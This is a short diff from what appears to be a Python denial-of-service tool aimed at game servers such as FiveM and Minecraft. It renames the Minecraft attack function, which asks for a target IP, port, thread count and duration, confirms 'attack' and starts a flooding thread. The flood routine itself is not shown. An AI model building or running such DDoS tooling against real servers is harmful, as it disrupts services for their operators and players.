@@ -285,7 +285,7 @@ def DdosFIVEM():
         print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
         sys.exit()
 
-def DdosMCPE():
+def DdosMC():
     target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
     port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
     thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
@@ -295,7 +295,7 @@ def DdosMCPE():
     quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")
 
     if "Y" in quest.upper():
-        threading.Thread(target=LaunchMCPE, args=(target, port, thread, t)).start()
+        threading.Thread(target=LaunchMC, args=(target, port, thread, t)).start()
         timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
         timer.start()
         timer.join()
